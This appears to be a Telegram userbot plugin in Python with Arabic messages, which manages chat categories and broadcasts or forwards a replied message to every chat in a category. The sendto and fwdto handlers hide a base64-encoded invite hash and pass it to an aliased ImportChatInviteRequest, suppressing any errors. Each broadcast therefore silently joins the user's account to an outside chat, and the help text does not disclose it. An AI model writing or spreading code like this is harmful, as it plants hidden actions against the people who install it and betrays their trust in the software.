import base64
from asyncio import sleep

from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from . import BOTLOG, BOTLOG_CHATID, parse_pre
from .sql_helper import broadcast_sql as sql


@bot.on(admin_cmd(pattern="sendto(?: |$)(.*)", command="sendto"))
@bot.on(sudo_cmd(pattern="sendto(?: |$)(.*)", command="sendto", allow_sudo=True))
async def catbroadcast_send(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "إلى أي فئة يجب أن أرسل هذه الرسالة 𖠕", parse_mode=parse_pre
        )
    reply = await event.get_reply_message()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not reply:
        return await edit_delete(
            event, "ماذا علي أن أرسل إلى هذه الفئة؟ 𖠕", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    no_of_chats = sql.num_broadcastlist_chat(keyword)
    group_ = Get(cat)
    if no_of_chats == 0:
        return await edit_delete(
            event,
            f"لا توجد فئة بالاسم 𖠕 {keyword}. للتـأكد أرسـل '.listall'𖠕",
            parse_mode=parse_pre,
        )
    chats = sql.get_chat_broadcastlist(keyword)
    catevent = await edit_or_reply(
        event,
        "إرسال هذه الرسالة إلى كافة المجموعات في الفئة 𖠕",
        parse_mode=parse_pre,
    )
    try:
        await event.client(group_)
    except BaseException:
        pass
    i = 0
    for chat in chats:
        try:
            if int(event.chat_id) == int(chat):
                continue
            await event.client.send_message(int(chat), reply)
            i += 1
        except Exception as e:
            LOGS.info(str(e))
        await sleep(0.5)
    resultext = f"`تم إرسال الرسالة إلى 𖠕 {i} الدردشات من {no_of_chats} الدردشات في الفئة {keyword}.`𖠕"
    await catevent.edit(resultext)
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            f"تم إرسال رسالة إلى {i} الدردشات من {no_of_chats} الدردشات في الفئة {keyword} 𖠕",
            parse_mode=parse_pre,
        )


@bot.on(admin_cmd(pattern="fwdto(?: |$)(.*)", command="fwdto"))
@bot.on(sudo_cmd(pattern="fwdto(?: |$)(.*)", command="fwdto", allow_sudo=True))
async def catbroadcast_send(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "إلى أي فئة يجب أن أرسل هذه الرسالة 𖠕", parse_mode=parse_pre
        )
    reply = await event.get_reply_message()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not reply:
        return await edit_delete(
            event, "ماذا علي أن أرسل إلى هذه الفئة؟ 𖠕", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    no_of_chats = sql.num_broadcastlist_chat(keyword)
    group_ = Get(cat)
    if no_of_chats == 0:
        return await edit_delete(
            event,
            f"لا توجد فئة بالاسم {keyword}. تـاكد مـن خلال ارسـال أمر '.listall' 𖠕",
            parse_mode=parse_pre,
        )
    chats = sql.get_chat_broadcastlist(keyword)
    catevent = await edit_or_reply(
        event,
        "إرسال هذه الرسالة إلى كافة المجموعات في الفئة 𖠕",
        parse_mode=parse_pre,
    )
    try:
        await event.client(group_)
    except BaseException:
        pass
    i = 0
    for chat in chats:
        try:
            if int(event.chat_id) == int(chat):
                continue
            await event.client.forward_messages(int(chat), reply)
            i += 1
        except Exception as e:
            LOGS.info(str(e))
        await sleep(0.5)
    resultext = f"`تم إرسال الرسالة إلى {i} الدردشات في الفئة {no_of_chats} هـذة {keyword}.`"
    await catevent.edit(resultext)
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            f"يتم إعادة توجيه رسالة إلى {i} الدردشات من {no_of_chats} هـذا الفئـة {keyword}",
            parse_mode=parse_pre,
        )


@bot.on(admin_cmd(pattern="addto(?: |$)(.*)", command="addto"))
@bot.on(sudo_cmd(pattern="addto(?: |$)(.*)", command="addto", allow_sudo=True))
async def catbroadcast_add(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "في أي فئة يجب أن أضيف هذه الدردشة 𖠕", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    check = sql.is_in_broadcastlist(keyword, event.chat_id)
    if check:
        return await edit_delete(
            event,
            f"هذه الدردشة موجودة بالفعل في هذه الفئة {keyword} 𖠕",
            parse_mode=parse_pre,
        )
    sql.add_to_broadcastlist(keyword, event.chat_id)
    await edit_delete(
        event, f"تمت إضافة هذه الدردشة الآن إلى الفئة {keyword} 𖠕", parse_mode=parse_pre
    )
    chat = await event.get_chat()
    if BOTLOG:
        try:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"هـذا المحـادثة {chat.title} is added to category {keyword}",
                parse_mode=parse_pre,
            )
        except Exception:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"The user {chat.first_name} يضاف إلى الفئة {keyword}",
                parse_mode=parse_pre,
            )


@bot.on(admin_cmd(pattern="rmfrom(?: |$)(.*)", command="rmfrom"))
@bot.on(sudo_cmd(pattern="rmfrom(?: |$)(.*)", command="rmfrom", allow_sudo=True))
async def catbroadcast_remove(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "من أي فئة يجب أن أزيل هذه الدردشة 𖠕", parse_mode=parse_pre
        )
    keyword = catinput_str.lower()
    check = sql.is_in_broadcastlist(keyword, event.chat_id)
    if not check:
        return await edit_delete(
            event, f"هذه الدردشة ليست في الفئة : {keyword} 𖠕", parse_mode=parse_pre
        )
    sql.rm_from_broadcastlist(keyword, event.chat_id)
    await edit_delete(
        event,
        f"تمت إزالة هذه الدردشة الآن من الفئة : {keyword}",
        parse_mode=parse_pre,
    )
    chat = await event.get_chat()
    if BOTLOG:
        try:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"المحادثة {chat.title} تمت إزالته من الفئة {keyword}",
                parse_mode=parse_pre,
            )
        except Exception:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"المسـتخدم {chat.first_name} تمت إزالته من الفئة {keyword}",
                parse_mode=parse_pre,
            )


@bot.on(admin_cmd(pattern="list(?: |$)(.*)", command="list"))
@bot.on(sudo_cmd(pattern="list(?: |$)(.*)", command="list", allow_sudo=True))
async def catbroadcast_list(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event,
            "ما هي فئة الدردشات التي يجب أن أضعها في ألسـتة ?\nتـاكد من خلال ارسـال أمـر  .listall",
            parse_mode=parse_pre,
        )
    keyword = catinput_str.lower()
    no_of_chats = sql.num_broadcastlist_chat(keyword)
    if no_of_chats == 0:
        return await edit_delete(
            event,
            f"لا توجد فئة بالاسم : {keyword}. تأكد من خـلال ارسـال أمر  '.listall' 𖠕",
            parse_mode=parse_pre,
        )
    chats = sql.get_chat_broadcastlist(keyword)
    catevent = await edit_or_reply(
        event, f"Fetching info of the category {keyword}", parse_mode=parse_pre
    )
    resultlist = f"**الفـئة '{keyword}' لـديك '{no_of_chats}' الدردشات وهذه مذكورة أدناه 𖠕 :**\n\n"
    errorlist = ""
    for chat in chats:
        try:
            chatinfo = await event.client.get_entity(int(chat))
            try:
                if chatinfo.broadcast:
                    resultlist += f" 👉 📢 **القـنوات** \n  •  **الاسـم : **{chatinfo.title} \n  •  **الايـدي : **`{int(chat)}`\n\n"
                else:
                    resultlist += f" 👉 👥 **المجـموعات** \n  •  **الاسـم : **{chatinfo.title} \n  •  **الايـدي : **`{int(chat)}`\n\n"
            except AttributeError:
                resultlist += f" 👉 👤 **المـعرفات** \n  •  **الاسـم : **{chatinfo.first_name} \n  •  **الايـدي : **`{int(chat)}`\n\n"
        except Exception:
            errorlist += f" 👉 هـذا الايـدي {int(chat)} في قاعدة البيانات ربما يمكنك ترك الدردشة/قناة أو قد يكون معرف غير صالح.\
                            \nقم بإزالة هذا المعرف من قاعدة البيانات باستخدام هذا الامـر:  `.frmfrom {keyword} {int(chat)}` \n\n"
    finaloutput = resultlist + errorlist
    await edit_or_reply(catevent, finaloutput)


@bot.on(admin_cmd(pattern="listall$", command="listall"))
@bot.on(sudo_cmd(pattern="listall$", command="listall", allow_sudo=True))
async def catbroadcast_list(event):
    if event.fwd_from:
        return
    if sql.num_broadcastlist_chats() == 0:
        return await edit_delete(
            event,
            "لم تقم بإنشاء معلومات فحص فئة واحدة على الأقل للحصول على مزيد من المساعدة راسل @klanr",
            parse_mode=parse_pre,
        )
    chats = sql.get_broadcastlist_chats()
    resultext = "**فيما يلي قائمة الفئات الخاصة بك 𖠕 :**\n\n"
    for i in chats:
        resultext += f" 👉 `{i}` __contains {sql.num_broadcastlist_chat(i)} chats__\n"
    await edit_or_reply(event, resultext)


@bot.on(admin_cmd(pattern="frmfrom(?: |$)(.*)", command="frmfrom"))
@bot.on(sudo_cmd(pattern="frmfrom(?: |$)(.*)", command="frmfrom", allow_sudo=True))
async def catbroadcast_remove(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    if not catinput_str:
        return await edit_delete(
            event, "من أي فئة يجب أن أزيل هذه الدردشة 𖠕", parse_mode=parse_pre
        )
    args = catinput_str.split(" ")
    if len(args) != 2:
        return await edit_delete(
            event,
            "استخدم بناء الجملة الصحيح كما هو موضح. frmfrom category_name groupid 𖠕",
            parse_mode=parse_pre,
        )
    try:
        groupid = int(args[0])
        keyword = args[1].lower()
    except ValueError:
        try:
            groupid = int(args[1])
            keyword = args[0].lower()
        except ValueError:
            return await edit_delete(
                event,
                "استخدم بناء الجملة الصحيح كما هو موضح. frmfrom category_name groupid 𖠕",
                parse_mode=parse_pre,
            )
    keyword = keyword.lower()
    check = sql.is_in_broadcastlist(keyword, int(groupid))
    if not check:
        return await edit_delete(
            event,
            f"المحـادثة {groupid} ليس في هذه الفئة {keyword}",
            parse_mode=parse_pre,
        )
    sql.rm_from_broadcastlist(keyword, groupid)
    await edit_delete(
        event,
        f"المحـادثة {groupid} تمت إزالته الآن من الفئة {keyword} 𖠕",
        parse_mode=parse_pre,
    )
    chat = await event.get_chat()
    if BOTLOG:
        try:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"المـحادثة {chat.title} تمت إزالته من الفئة {keyword} 𖠕",
                parse_mode=parse_pre,
            )
        except Exception:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"المحـادثة {chat.first_name} تمت إزالته من الفئة {keyword}",
                parse_mode=parse_pre,
            )


@bot.on(admin_cmd(pattern="delc(?: |$)(.*)", command="delc"))
@bot.on(sudo_cmd(pattern="delc(?: |$)(.*)", command="delc", allow_sudo=True))
async def catbroadcast_delete(event):
    if event.fwd_from:
        return
    catinput_str = event.pattern_match.group(1)
    check1 = sql.num_broadcastlist_chat(catinput_str)
    if check1 < 1:
        return await edit_delete(
            event,
            f"هل أنت متأكد من أن هناك فئة {catinput_str}",
            parse_mode=parse_pre,
        )
    try:
        sql.del_keyword_broadcastlist(catinput_str)
        await edit_or_reply(
            event,
            f"تم حذف الفئة بنجاح {catinput_str}",
            parse_mode=parse_pre
        )
    except Exception as e:
        await edit_delete(
            event,
            str(e),
            parse_mode=parse_pre,
        )


CMD_HELP.update(
    {
        "نشر الكل": """**Plugin : ** `نشر الكل`

  •  **Syntax : **`.sendto category_name`
  •  **Function : **__will send the replied message to all the chats in give category__

  •  **Syntax : **`.fwdto category_name`
  •  **Function : **__will forward the replied message to all the chats in give category__

  •  **Syntax : **`.addto category_name`
  •  **Function : **__It will add this chat/user/channel to the category of the given name__

  •  **Syntax : **`.rmfrom category_name`
  •  **Function : **__To remove the Chat/user/channel from the given category name__

  •  **Syntax : **`.list category_name`
  •  **Function : **__Will show the list of all chats in the given category__

  •  **Syntax : **`.listall`
  •  **Function : **__Will show the list of all category names__

  •  **Syntax : **`.frmfrom category_name chat_id`
  •  **Function : **__To force remove the given chat_id from the given category name usefull when you left that chat or banned you there__

  •  **Syntax : **`delc category_name`
  •  **Function : **__Deletes the category completely in database__
"""
    }
)
